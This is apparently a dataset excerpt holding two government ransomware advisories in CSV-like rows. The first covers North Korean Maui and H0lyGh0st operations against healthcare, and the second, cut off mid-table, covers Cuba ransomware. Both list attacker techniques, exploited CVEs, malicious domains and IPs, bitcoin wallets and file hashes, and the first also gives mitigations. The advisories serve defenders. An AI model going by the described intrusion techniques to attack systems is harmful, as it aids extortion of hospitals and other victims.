9b9d4cb1f681f19417e541178d8c75d7
f5f6e538001803b0aa008422caf2c3c2a79b2eeee9ddc7feda710e4aba96fea4


a1f9e9f5061313325a275d448d4ddd59
dfdd72c9ce1212f9d9455e2bca5a327c88d2d424ea5c086725897c83afc3d42d


a452a5f693036320b580d28ee55ae2a3
99b0056b7cc2e305d4ccb0ac0a8a270d3fceb21ef6fc2eb13521a930cea8bd9f


a6e1efd70a077be032f052bb75544358
3b9fe1713f638f85f20ea56fd09d20a96cd6d288732b04b073248b56cdaef878


ad4eababfe125110299e5a24be84472e
a557a0c67b5baa7cf64bd4d42103d3b2852f67acf96b4c5f14992c1289b55eaa


b1c1d28dc7da1d58abab73fa98f60a83
38491f48d0cbaab7305b5ddca64ba41a2beb89d81d5fb920e67d0c7334c89131


b6f91a965b8404d1a276e43e61319931
--


bdece9758bf34fcad9cba1394519019b
9d6de05f9a3e62044ad9ae66111308ccb9ed2ee46a3ea37d85afa92e314e7127


c3850f4cc12717c2b54753f8ca5d5e0e
99b448e91669b92c2cc3417a4d9711209509274dab5d7582baacfab5028a818c


c50b839f2fc3ce5a385b9ae1c05def3a
458d258005f39d72ce47c111a7d17e8c52fe5fc7dd98575771640d9009385456


cf236bf5b41d26967b1ce04ebbdb4041
60425a4d5ee04c8ae09bfe28ca33bf9e76a43f69548b2704956d0875a0f25145


d0e203e8845bf282475a8f816340f2e8
f6375c5276d1178a2a0fe1a16c5668ce523e2f846c073bf75bb2558fdec06531


ddb1f970371fa32faae61fc5b8423d4b
dda53eee2c5cb0abdbf5242f5e82f4de83898b6a9dd8aa935c2be29bafc9a469


f2f787868a3064407d79173ac5fc0864
92adc5ea29491d9245876ba0b2957393633c9998eb47b3ae1344c13a44cd59ae


fda3a19afa85912f6dc8452675245d6b
56925a1f7d853d814f80e98a1c4890b0a6a84c83a8eded34c585c98b2df6ab19


--
0054147db54544d77a9efd9baf5ec96a80b430e170d6e7c22fcf75261e9a3a71


--
151ab3e05a23e9ccd03a6c49830dabb9e9281faf279c31ae40b13e6971dd2fb8


--
1c926fb3bd99f4a586ed476e4683163892f3958581bf8c24235cd2a415513b7f


--
1f8dcfaebbcd7e71c2872e0ba2fc6db81d651cf654a21d33c78eae6662e62392


--
f226086b5959eb96bd30dec0ffcbf0f09186cd11721507f416f1c39901addafb


--
23eff00dde0ee27dabad28c1f4ffb8b09e876f1e1a77c1e6fb735ab517d79b76


--
586f30907c3849c363145bfdcdabe3e2e4688cbd5688ff968e984b201b474730


--
8ce219552e235dcaf1c694be122d6339ed4ff8df70bf358cd165e6eb487ccfc5


--
90fb0cd574155fd8667d20f97ac464eca67bdb6a8ee64184159362d45d79b6a4


--
c2904dc8bbb569536c742fca0c51a766e836d0da8fac1c1abd99744e9b50164f


--
ca932ccaa30955f2fffb1122234fb1524f7de3a8e0044de1ed4fe05cab8702a5


--
f6827dc5af661fbb4bf64bc625c78283ef836c6985bb2bfb836bd0c8d5397332


--
f78cabf7a0e7ed3ef2d1c976c1486281f56a6503354b87219b466f2f7a0b65c4



Table 3 lists MD5 and SHA256 hashes are associated with Maui Ransomware files.

Table 3: File names and hashes of Maui ransomware files


MD5 Hash
SHA256 Hash




4118d9adce7350c3eedeb056a3335346
5b7ecf7e9d0715f1122baf4ce745c5fcd769dee48150616753fec4d6da16e99e


9b0e7c460a80f740d455a7521f0eada1
45d8ac1ac692d6bb0fe776620371fca02b60cac8db23c4cc7ab5df262da42b78


fda3a19afa85912f6dc8452675245d6b
56925a1f7d853d814f80e98a1c4890b0a6a84c83a8eded34c585c98b2df6ab19


2d02f5499d35a8dffb4c8bc0b7fec5c2
830207029d83fd46a4a89cd623103ba2321b866428aa04360376e6a390063570


c50b839f2fc3ce5a385b9ae1c05def3a
458d258005f39d72ce47c111a7d17e8c52fe5fc7dd98575771640d9009385456


a452a5f693036320b580d28ee55ae2a3
99b0056b7cc2e305d4ccb0ac0a8a270d3fceb21ef6fc2eb13521a930cea8bd9f


a6e1efd70a077be032f052bb75544358
3b9fe1713f638f85f20ea56fd09d20a96cd6d288732b04b073248b56cdaef878


802e7d6e80d7a60e17f9ffbd62fcbbeb
87bdb1de1dd6b0b75879d8b8aef80b562ec4fad365d7abbc629bcfc1d386afa6


--
0054147db54544d77a9efd9baf5ec96a80b430e170d6e7c22fcf75261e9a3a71



Table 4 lists MD5 and SHA256 hashes associated with H0lyGh0st Ransomware files.



SHA256 Hash




99fc54786a72f32fd44c7391c2171ca31e72ca52725c68e2dde94d04c286fccd*


F8fc2445a9814ca8cf48a979bff7f182d6538f4d1ff438cf259268e8b4b76f86*


Bea866b327a2dc2aa104b7ad7307008919c06620771ec3715a059e675d9f40af*


6e20b73a6057f8ff75c49e1b7aef08abfcfe4e418e2c1307791036f081335c2d


f4d10b08d7dacd8fe33a6b54a0416eecdaed92c69c933c4a5d3700b8f5100fad


541825cb652606c2ea12fd25a842a8b3456d025841c3a7f563655ef77bb67219


2d978df8df0cf33830aba16c6322198e5889c67d49b40b1cb1eb236bd366826d


414ed95d14964477bebf86dced0306714c497cde14dede67b0c1425ce451d3d7


Df0c7bb88e3c67d849d78d13cee30671b39b300e0cda5550280350775d5762d8






MD5 Hash




a2c2099d503fcc29478205f5aef0283b


9c516e5b95a7e4169ecbd133ed4d205f


d6a7b5db62bf7815a10a17cdf7ddbd4b


c6949a99c60ef29d20ac8a9a3fb58ce5


4b20641c759ed563757cdd95c651ee53


25ee4001eb4e91f7ea0bc5d07f2a9744


18126be163eb7df2194bb902c359ba8e


eaf6896b361121b2c315a35be837576d


e4ee611533a28648a350f2dab85bb72a


e268cb7ab778564e88d757db4152b9fa



* from Microsoft blog post on h0lygh0st
CONTACT INFORMATION
NSA Client Requirements / General Cybersecurity Inquiries: CybersecurityReports@nsa.govDefense Industrial Base Inquiries and Cybersecurity Services: DIB_Defense@cyber.nsa.govTo report incidents and anomalous activity related to information found in this Joint Cybersecurity Advisory, contact CISA’s 24/7 Operations Center at SayCISA@cisa.dhs.gov or 1-844-Say-CISA (1-844-729-2472) or your local FBI field office at www.fbi.gov/contact-us/field. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact.
Media Inquiries / Press Desk:

NSA Media Relations, 443-634-0721, MediaRelations@nsa.gov
CISA Media Relations, 703-235-2010, CISAMedia@cisa.dhs.gov







This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1583', 'T1083', 'T1190', 'TA0008', 'TA0040', 'T1021', 'T1486', 'TA0001', 'T1195', 'T1583.003', 'T1133', 'TA0010', 'TA0007'}","



SUMMARY
Note: This Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and various ransomware threat actors. These #StopRansomware advisories detail historically and recently observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn about other ransomware threats and no-cost resources.
The United States National Security Agency (NSA), the U.S. Federal Bureau of Investigation (FBI), the U.S. Cybersecurity and Infrastructure Security Agency (CISA), the U.S. Department of Health and Human Services (HHS), the Republic of Korea (ROK) National Intelligence Service (NIS), and the ROK Defense Security Agency (DSA) (hereafter referred to as the “authoring agencies”) are issuing this joint Cybersecurity Advisory (CSA) to highlight ongoing ransomware activity against Healthcare and Public Health Sector organizations and other critical infrastructure sector entities.
This CSA provides an overview of Democratic People’s Republic of Korea (DPRK) state-sponsored ransomware and updates the July 6, 2022, joint CSA North Korean State-Sponsored Cyber Actors Use Maui Ransomware to Target the Healthcare and Public Health Sector. This advisory highlights TTPs and IOCs DPRK cyber actors used to gain access to and conduct ransomware attacks against Healthcare and Public Health (HPH) Sector organizations and other critical infrastructure sector entities, as well as DPRK cyber actors’ use of cryptocurrency to demand ransoms.
The authoring agencies assess that an unspecified amount of revenue from these cryptocurrency operations supports DPRK national-level priorities and objectives, including cyber operations targeting the United States and South Korea governments—specific targets include Department of Defense Information Networks and Defense Industrial Base member networks. The IOCs in this product should be useful to sectors previously targeted by DPRK cyber operations (e.g., U.S. government, Department of Defense, and Defense Industrial Base). The authoring agencies highly discourage paying ransoms as doing so does not guarantee files and records will be recovered and may pose sanctions risks.
For additional information on state-sponsored DPRK malicious cyber activity, see CISA’s North Korea Cyber Threat Overview and Advisories webpage.
Download the PDF version of this report: pdf, 661 kb.
For a downloadable copy of IOCs, see


AA23-040A STIX XML
(XML,       196.24 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 12. See MITRE ATT&CK for Enterprise for all referenced tactics and techniques.
This CSA is supplementary to previous reports on malicious cyber actor activities involving DPRK ransomware campaigns—namely Maui and H0lyGh0st ransomware. The authoring agencies are issuing this advisory to highlight additional observed TTPs DPRK cyber actors are using to conduct ransomware attacks targeting South Korean and U.S. healthcare systems.
Observable TTPs
The TTPs associated with DPRK ransomware attacks include those traditionally observed in ransomware operations. Additionally, these TTPs span phases from acquiring and purchasing infrastructure to concealing DPRK affiliation:

Acquire Infrastructure,. DPRK actors generate domains, personas, and accounts; and identify cryptocurrency services to conduct their ransomware operations. Actors procure infrastructure, IP addresses, and domains with cryptocurrency generated through illicit cybercrime, such as ransomware and cryptocurrency theft.
Obfuscate Identity. DPRK actors purposely obfuscate their involvement by operating with or under third-party foreign affiliate identities and use third-party foreign intermediaries to receive ransom payments.
Purchase VPNs and VPSs,. DPRK cyber actors will also use virtual private networks (VPNs) and virtual private servers (VPSs) or third-country IP addresses to appear to be from innocuous locations instead of from DPRK.
Gain Access,. Actors use various exploits of common vulnerabilities and exposures (CVE) to gain access and escalate privileges on networks. Recently observed CVEs that actors used to gain access include remote code execution in the Apache Log4j software library (known as Log4Shell) and remote code execution in unpatched SonicWall SMA 100 appliances, and,. Observed CVEs used include:
CVE 2021-44228
CVE-2021-20038
CVE-2022-24990

Actors also likely spread malicious code through Trojanized files for “X-Popup,” an open source messenger commonly used by employees of small and medium hospitals in South Korea,.
The actors spread malware by leveraging two domains: xpopup.pe,.,kr and xpopup.com. xpopup.pe,.,kr is registered to IP address 115.68.95,.,128 and xpopup,.,com is registered to IP address 119.205.197,.,111. Related file names and hashes are listed in table 1.


Move Laterally and Discovery,. After initial access, DPRK cyber actors use staged payloads with customized malware to perform reconnaissance activities, upload and download additional files and executables, and execute shell commands,. The staged malware is also responsible for collecting victim information and sending it to the remote host controlled by the actors,.
Employ Various Ransomware Tools,. Actors have used privately developed ransomware, such as Maui and H0lyGh0st,. Actors have also been observed using or possessing publically available tools for encryption, such as BitLocker, Deadbolt, ech0raix, GonnaCry, Hidden Tear, Jigsaw, LockBit 2.0, My Little Ransomware, NxRansomware, Ryuk, and YourRansom,. In some cases, DPRK actors have portrayed themselves as other ransomware groups, such as the REvil ransomware group. For IOCs associated with Maui and H0lyGh0st ransomware usage, please see Appendix B.
Demand Ransom in Cryptocurrency. DPRK cyber actors have been observed setting ransoms in bitcoin,.
Actors are known to communicate with victims via Proton Mail email accounts. For private companies in the healthcare sector, actors may threaten to expose a company’s proprietary data to competitors if ransoms are not paid. Bitcoin wallet addresses possibly used by DPRK cyber actors include:

1MTHBCrBKYEthfa16zo9kabt4f9jMJz8Rm
bc1q80vc4yjgg6umedkut3e9mhehxl4q4dcjjyzh59
1J8spy62o7z2AjQxoUpiCGnBh5cRWKVWJC
16ENLdHbnmDcEV8iqN4vuyZHa7sSdYRh76
bc1q3wzxvu8yhs8h7mlkmf7277wyklkah9k4sm9anu
bc1q8xyt4jxhw7mgqpwd6qfdjyxgvjeuz57jxrvgk9
1NqihEqYaQaWiZkPVdSMiTbt7dTy1LMxgX
bc1qxrpevck3pq1yzrx2pq2rkvkvy0jnm56nzjv6pw
14hVKm7Ft2rxDBFTNkkRC3kGstMGp2A4hk
1KCwfCUgnSy3pzNX7U1i5NwFzRtth4bRBc
16sYqXancDDiijcuruZecCkdBDwDf4vSEC
1N6JphHFaYmYaokS5xH31Z67bvk4ykd9CP
LZ1VNJfn6mWjPzkCyoBvqWaBZYXAwn135
1KmWW6LgdgykBBrSXrFu9kdoHz95Fe9kQF
1FX4W9rrG4F3Uc7gJ18GCwGab8XuW8Ajy2
bc1qlqgu2l2kms5338zuc95kxavctzyy0v705tpvyc
bc1qy6su7vrh7ts5ng2628escmhr98msmzg62ez2sp
bc1q8t69gpxsezdcr8w6tfzp3jeptq4tcp2g9d0mwy
bc1q9h7yj79sqm4t536q0fdn7n4y2atsvvl22m28ep
bc1qj6y72rk039mqpgtcy7mwjd3eum6cx6027ndgmd
bc1qcp557vltuu3qc6pk3ld0ayagrxuf2thp3pjzpe
bc1ql8wsflrjf9zlusauynzjm83mupq6c9jz9vnqxg
bc1qx60ec3nfd5yhsyyxkzkpts54w970yxj84zrdck
bc1qunqnjdlvqkjuhtclfp8kzkjpvdz9qnk898xczp
bc1q6024d73h48fnhwswhwt3hqz2lzw6x99q0nulm4
bc1qwdvexlyvg3mqvqw7g6l09qup0qew80wjj9jh7x
bc1qavrtge4p7dmcrnvhlvuhaarx8rek76wxyk7dgg
bc1qagaayd57vr25dlqgk7f00nhz9qepqgnlnt4upu
bc1quvnaxnpqlzq3mdhfddh35j7e7ufxh3gpc56hca
bc1qu0pvfmtxawm8s99lcjvxapungtsmkvwyvak6cs
bc1qg3zlxxhhcvt6hkuhmqml8y9pas76cajcu9ltdl
bc1qn7a3g23nzpuytchyyteyhkcse84cnylznl3j32
bc1qhfmqstxp3yp9muvuz29wk77vjtdyrkff4nrxpu
bc1qnh8scrvuqvlzmzgw7eesyrmtes9c5m78duetf3
bc1q7qry3lsrphmnw3exs7tkwzpvzjcxs942aq8n0y
bc1qcmlcxfsy0zlqhh72jvvc4rh7hvwhx6scp27na0
bc1q498fn0gauj2kkjsg35mlwk2cnxhaqlj7hkh8xy
bc1qnz4udqkumjghnm2a3zt0w3ep8fwdcyv3krr3jq
bc1qk0saaw7p0wrwla6u7tfjlxrutlgrwnudzx9tyw
bc1qyue2pgjk09ps7qvfs559k8kee3jkcw4p4vdp57
bc1q6qfkt06xmrpclht3acmq00p7zyy0ejydu89zwv
bc1qmge6a7sp659exnx78zhm9zgrw88n6un0rl9trs
bc1qcywkd7zqlwmjy36c46dpf8cq6ts6wgkjx0u7cn



MITIGATIONS
Note: These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the U.S. National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. For more information on the CPGs, including additional recommended baseline protections, see cisa.gov/cpg.
The authoring agencies urge HPH organizations to:

Limit access to data by authenticating and encrypting connections (e.g., using public key infrastructure certificates in virtual private network (VPN) and transport layer security (TLS) connections) with network services, Internet of Things (IoT) medical devices, and the electronic health record system,CPG 3.3,.
Implement the principle of least privilege by using standard user accounts on internal systems instead of administrative accounts,CPG 1.5, which grant excessive system administration privileges.
Turn off weak or unnecessary network device management interfaces, such as Telnet, SSH, Winbox, and HTTP for wide area networks (WANs) and secure with strong passwords and encryption when enabled.
Protect stored data by masking the permanent account number (PAN) when displayed and rendering it unreadable when stored—through cryptography, for example.
Secure the collection, storage, and processing practices for personally identifiable information (PII)/protected health information (PHI), per regulations such as the Health Insurance Portability and Accountability Act of 1996 (HIPAA). Implementing HIPAA security measures could prevent the introduction of malware to the system,CPG 3.4,.

Secure PII/ PHI at collection points and encrypt the data at rest and in transit using technologies, such as TLS. Only store personal patient data on internal systems that are protected by firewalls, and ensure extensive backups are available.
Create and regularly review internal policies that regulate the collection, storage, access, and monitoring of PII/PHI.


Implement and enforce multi-layer network segmentation with the most critical communications and data resting on the most secure and reliable layer,CPG 8.1,.
Use monitoring tools to observe whether IoT devices are behaving erratically due to a compromise,CPG 3.1,.

In addition, the authoring agencies urge all organizations, including HPH Sector organizations, to apply the following recommendations to prepare for and mitigate ransomware incidents:

Maintain isolated backups of data, and regularly test backup and restoration,CPG 7.3,. These practices safeguard an organization’s continuity of operations or at least minimize potential downtime from a ransomware incident and protect against data losses.

Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure.


Create, maintain, and exercise a basic cyber incident response plan and associated communications plan that includes response procedures for a ransomware incident,CPG 7.1, 7.2,.

Organizations should also ensure their incident response and communications plans include data breach incidents response and notification procedures. Ensure the notification procedures adhere to applicable laws.
See the CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide and CISA Fact Sheet Protecting Sensitive and Personal Information from Ransomware-Caused Data Breaches for information on creating a ransomware response checklist and planning and responding to ransomware-caused data breaches.


Install updates for operating systems, software, and firmware as soon as they are released,CPG 5.1,. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Regularly check for software updates and end-of-life notifications and prioritize patching known exploited vulnerabilities. Consider leveraging a centralized patch management system to automate and expedite the process.
If you use Remote Desktop Protocol (RDP), or other potentially risky services, secure and monitor them closely,CPG 5.4,.

Limit access to resources over internal networks, especially by restricting RDP and using virtual desktop infrastructure. After assessing risks, if RDP is deemed operationally necessary, restrict the originating sources, and require phishing-resistant multifactor authentication (MFA) to mitigate credential theft and reuse,CPG 1.3,. If RDP must be available externally, use a VPN, virtual desktop infrastructure, or other means to authenticate and secure the connection before allowing RDP to connect to internal devices. Monitor remote access/RDP logs, enforce account lockouts after a specified number of attempts to block brute force campaigns, log RDP login attempts, and disable unused remote access/RDP ports,CPG 1.1, 3.1,.
Ensure devices are properly configured and that security features are enabled. Disable ports and protocols not in use for a business purpose (e.g., RDP Transmission Control Protocol port 3389).
Restrict the Server Message Block (SMB) protocol within the network to only access necessary servers and remove or disable outdated versions of SMB (i.e., SMB version 1). Threat actors use SMB to propagate malware across organizations.
Review the security posture of third-party vendors and those interconnected with your organization. Ensure all connections between third-party vendors and outside software or hardware are monitored and reviewed for suspicious activity,CPG 5.6, 6.2,.
Implement application control policies that only allow systems to execute known and permitted programs,CPG 2.1,.
Open document readers in protected viewing modes to help prevent active content from running.


Implement a user training program and phishing exercises,CPG 4.3, to raise awareness among users about the risks of visiting websites, clicking on links, and opening attachments. Reinforce the appropriate user response to phishing and spearphishing emails.
Require phishing-resistant MFA for as many services as possible,CPG 1.3,—particularly for webmail, VPNs, accounts that access critical systems, and privileged accounts that manage backups.
Use strong passwords,CPG 1.4, and avoid reusing passwords for multiple accounts. See CISA Tip Choosing and Protecting Passwords and National Institute of Standards and Technology (NIST) Special Publication 800-63B: Digital Identity Guidelines for more information.
Require administrator credentials to install software,CPG 1.5,.
Audit user accounts with administrative or elevated privileges,CPG 1.5, and configure access controls with least privilege in mind.
Install and regularly update antivirus and antimalware software on all hosts.
Only use secure networks. Consider installing and using a VPN.
Consider adding an email banner to messages coming from outside your organizations,CPG 8.3, indicating that they are higher risk messages.
Consider participating in CISA’s no-cost Automated Indicator Sharing (AIS) program to receive real-time exchange of machine-readable cyber threat indicators and defensive measures.

If a ransomware incident occurs at your organization:

Follow your organization’s ransomware response checklist.
Scan backups. If possible, scan backup data with an antivirus program to check that it is free of malware. This should be performed using an isolated, trusted system to avoid exposing backups to potential compromise.
U.S. organizations: Follow the notification requirements as outlined in your cyber incident response plan. Report incidents to appropriate authorities; in the U.S., this would include the FBI at a local FBI Field Office, CISA at cisa.gov/report, or the U.S. Secret Service (USSS) at a USSS Field Office.
South Korean organizations: Please report incidents to NIS, KISA (Korea Internet & Security Agency), and KNPA (Korean National Police Agency).

NIS (National Intelligence Service)

Telephone : 111
https://www.nis.go.kr


KISA (Korea Internet & Security Agency)

Telephone : 118 (Consult Service)
https://www.boho.or.kr/consult/ransomware.do


KNPA (Korean National Police Agency)

Electronic Cybercrime Report & Management System: https://ecrm.police.go.kr/minwon/main




Apply incident response best practices found in the joint Cybersecurity Advisory, Technical Approaches to Uncovering and Remediating Malicious Activity, developed by CISA and the cybersecurity authorities of Australia, Canada, New Zealand, and the United Kingdom.

RESOURCES
Stairwell provided a YARA rule to identify Maui ransomware, and a Proof of Concept public RSA key extractor at the following link:https://www.stairwell.com/news/threat-research-report-maui-ransomware/
REQUEST FOR INFORMATION
The FBI is seeking any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, bitcoin wallet information, the decryptor file, and/or benign samples of encrypted files. As stated above, the authoring agencies discourage paying ransoms. Payment does not guarantee files will be recovered and may embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. However, the agencies understand that when victims are faced with an inability to function, all options are evaluated to protect shareholders, employees, and customers.
Regardless of whether you or your organization decide to pay a ransom, the authoring agencies urge you to promptly report ransomware incidents using the contact information above.
ACKNOWLEDGEMENTS
NSA, FBI, CISA, and HHS would like to thank ROK NIS and DSA for their contributions to this CSA.
Disclaimer of endorsement
The information and opinions contained in this document are provided ""as is"" and without any warranties or guarantees. Reference herein to any specific commercial products, process, or service by trade name, trademark, manufacturer, or otherwise, does not constitute or imply its endorsement, recommendation, or favoring by the United States Government, and this guidance shall not be used for advertising or product endorsement purposes.
Trademark recognition
Microsoft Threat Intelligence Center is a registered trademark of Microsoft Corporation. Apache®, Sonicwall, and Apache Log4j are trademarks of Apache Software Foundation. TerraMaster Operating System is a registered trademark of Octagon Systems.
Purpose
This document was developed in furtherance of the authors’ cybersecurity missions, including their responsibilities to identify and disseminate threats, and to develop and issue cybersecurity specifications and mitigations. This information may be shared broadly to reach all appropriate stakeholders.
Appendix A: CVE Details



Appendix B: Indicators of Compromise (IOCs)
The IOC section includes hashes and IP addresses for the Maui and H0lyGh0st ransomware variants—as well as custom malware implants assumedly developed by DPRK cyber actors, such as remote access trojans (RATs), loaders, and other tools—that enable subsequent deployment of ransomware. For additional Maui IOCs, see joint CSA North Korean State-Sponsored Cyber Actors Use Maui Ransomware to Target the Healthcare and Public Health Sector.
Table 2 lists MD5 and SHA256 hashes associated with malware implants, RATs, and other tools used by DPRK cyber actors, including tools that drop Maui ransomware files.

Table 3 lists MD5 and SHA256 hashes are associated with Maui Ransomware files.

Table 4 lists MD5 and SHA256 hashes associated with H0lyGh0st Ransomware files.


* from Microsoft blog post on h0lygh0st
CONTACT INFORMATION
NSA Client Requirements / General Cybersecurity Inquiries: CybersecurityReports@nsa.govDefense Industrial Base Inquiries and Cybersecurity Services: DIB_Defense@cyber.nsa.govTo report incidents and anomalous activity related to information found in this Joint Cybersecurity Advisory, contact CISA’s 24/7 Operations Center at SayCISA@cisa.dhs.gov or 1-844-Say-CISA (1-844-729-2472) or your local FBI field office at www.fbi.gov/contact-us/field. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact.
Media Inquiries / Press Desk:

NSA Media Relations, 443-634-0721, MediaRelations@nsa.gov
CISA Media Relations, 703-235-2010, CISAMedia@cisa.dhs.gov







This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-040a
35,"




Summary

Actions to take today to mitigate cyber threats from ransomware:

• Prioritize remediating known exploited vulnerabilities.
• Train users to recognize and report phishing attempts.
• Enable and enforce phishing-resistant multifactor authentication.
Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
The FBI and the Cybersecurity and Infrastructure Security Agency (CISA) are releasing this joint CSA to disseminate known Cuba ransomware IOCs and TTPs associated with Cuba ransomware actors identified through FBI investigations, third-party reporting, and open-source reporting. This advisory updates the December 2021 FBI Flash: Indicators of Compromise Associated with Cuba Ransomware.
Note: While this ransomware is known by industry as “Cuba ransomware,” there is no indication Cuba ransomware actors have any connection or affiliation with the Republic of Cuba.
Since the release of the December 2021 FBI Flash, the number of U.S. entities compromised by Cuba ransomware has doubled, with ransoms demanded and paid on the increase.
This year, Cuba ransomware actors have added to their TTPs, and third-party and open-source reports have identified a possible link between Cuba ransomware actors, RomCom Remote Access Trojan (RAT) actors, and Industrial Spy ransomware actors.
FBI and CISA encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of Cuba ransomware and other ransomware operations.
Download the PDF version of this report: pdf, 649 kb.
For a downloadable copy of IOCs, see:

AA22-335A.stix (STIX 148 kb).
(Updated December 12, 2022) AA22-335A-2.stix (STIX, 67 kb). (End of Update.)


Technical Details

Overview
Since the December 2021 release of FBI Flash: Indicators of Compromise Associated with Cuba Ransomware, FBI has observed Cuba ransomware actors continuing to target U.S. entities in the following five critical infrastructure sectors: Financial Services, Government Facilities, Healthcare and Public Health, Critical Manufacturing, and Information Technology. As of August 2022, FBI has identified that Cuba ransomware actors have:

Compromised 101 entities, 65 in the United States and 36 outside the United States.
Demanded 145 million U.S. Dollars (USD) and received 60 million USD in ransom payments.

Cuba Ransomware Actors’ Tactics, Techniques, and Procedures
As previously reported by FBI, Cuba ransomware actors have leveraged the following techniques to gain initial access into dozens of entities in multiple critical infrastructure sectors:

Known vulnerabilities in commercial software [T1190]
Phishing campaigns [T1566]
Compromised credentials [T1078]
Legitimate remote desktop protocol (RDP) tools [T1563.002]

After gaining initial access, the actors distributed Cuba ransomware on compromised systems through Hancitor—a loader known for dropping or executing stealers, such as Remote Access Trojans (RATs) and other types of ransomware, onto victims’ networks.
Since spring 2022, Cuba ransomware actors have modified their TTPs and tools to interact with compromised networks and extort payments from victims.[1],[2]
Cuba ransomware actors have exploited known vulnerabilities and weaknesses and have used tools to elevate privileges on compromised systems. According to Palo Alto Networks Unit 42,[2] Cuba ransomware actors have:

Exploited CVE-2022-24521 in the Windows Common Log File System (CLFS) driver to steal system tokens and elevate privileges.
Used a PowerShell script to identify and target service accounts for their associated Active Directory Kerberos ticket. The actors then collected and cracked the Kerberos tickets offline via Kerberoasting [T1558.003].
Used a tool, called KerberCache, to extract cached Kerberos tickets from a host’s Local Security Authority Server Service (LSASS) memory [T1003.001].
Used a tool to exploit CVE-2020-1472 (also known as “ZeroLogon”) to gain Domain Administrative privileges [T1068]. This tool and its intrusion attempts have been reportedly related to Hancitor and Qbot.

According to Palo Alto Networks Unit 42, Cuba ransomware actors use tools to evade detection while moving laterally through compromised environments before executing Cuba ransomware. Specifically, the actors, “leveraged a dropper that writes a kernel driver to the file system called ApcHelper.sys. This targets and terminates security products. The dropper was not signed; however, the kernel driver was signed using the certificate found in the LAPSUS NVIDIA leak."" [T1562.001].[2]
In addition to deploying ransomware, the actors have used “double extortion” techniques, in which they exfiltrate victim data, and (1) demand a ransom payment to decrypt it and, (2) threaten to publicly release it if a ransom payment is not made.[2]
Cuba Ransomware Link to RomCom and Industrial Spy Marketplace
Since spring 2022, third-party and open-source reports have identified an apparent link between Cuba ransomware actors, RomCom RAT actors, and Industrial Spy ransomware actors:

According to Palo Alto Networks Unit 42, Cuba ransomware actors began using RomCom malware, a custom RAT, for command and control (C2).[2]
Cuba ransomware actors may also be leveraging Industrial Spy ransomware. According to third-party reporting, suspected Cuba ransomware actors compromised a foreign healthcare company. The threat actors deployed Industrial Spy ransomware, which shares distinct similarities in configuration to Cuba ransomware. Before deploying the ransomware, the actors moved laterally using Impacket and deployed the RomCom RAT and Meterpreter Reverse Shell HTTP/HTTPS proxy via a C2 server [T1090].
Cuba ransomware actors initially used their leak site to sell stolen data; however, around May 2022, the actors began selling their data on Industrial Spy’s online market for selling stolen data.[2]

RomCom actors have targeted foreign military organizations, IT companies, food brokers and manufacturers.[3][4] The actors copied legitimate HTML code from public-facing webpages, modified the code, and then incorporated it in spoofed domains [T1584.001], which allowed the RomCom actors to:

Host counterfeit Trojanized applications for

SolarWinds Network Performance Monitor (NPM),
KeePass password manager,
PDF Reader Pro, (by PDF Technologies, Inc., not an Adobe Acrobat or Reader product), and
Advanced IP Scanner software;


Deploy the RomCom RAT as the final stage.

INDICATORS OF COMPROMISE
See tables 1 through 5 for Cuba ransomware IOCs that FBI obtained during threat response investigations as of late August 2022. In addition to these tables, see the publications in the References section below for aid in detecting possible exploitation or compromise.
Note: For IOCs as of early November 2021, see FBI Flash: Indicators of Compromise Associated with Cuba Ransomware.



Table 1: Cuba Ransomware Associated Files and Hashes, as of Late August 2022



File Name


File Path


File Hash






netping.dll


c:\windows\temp


SHA256: f1103e627311e73d5f29e877243e7ca203292f9419303c661aec57745eb4f26c




shar.bat


 


MD5: 4c32ef0836a0af7025e97c6253054bca
SHA256: a7c207b9b83648f69d6387780b1168e2f1eabd23ae6e162dd700ae8112f8b96c




Psexesvc.exe


 


SHA256: 141b2190f51397dbd0dfde0e3904b264c91b6f81febc823ff0c33da980b69944




1.bat


 


 




216155s.dll


 


 




23246s.bat


 


SHA256: 02a733920c7e69469164316e3e96850d55fca9f5f9d19a241fad906466ec8ae8




23246s.dll


 


SHA256: 0cf6399db55d40bc790a399c6bbded375f5a278dc57a143e4b21ea3f402f551f




23246st.dll


 


SHA256: f5db51115fa0c910262828d0943171d640b4748e51c9a140d06ea81ae6ea1710




259238e.exe


 


 




31-100.bat


 


 




3184.bat


 


 




3184.dll


 


 




45.dll


 


SHA256: 
857f28b8fe31cf5db6d45d909547b151a66532951f26cda5f3320d2d4461b583




4ca736d.exe


 


 




62e2e37.exe


 


 




64.235.39.82


 


 




64s.dll


 


 




7z.sfx


 


 




7zCon.sfx


 


 




7-zip.chm


 


 




82.ps1


 


 




9479.bat


 


SHA256: 08eb4366fc0722696edb03981f00778701266a2e57c40cd2e9d765bf8b0a34d0




9479p.bat


 


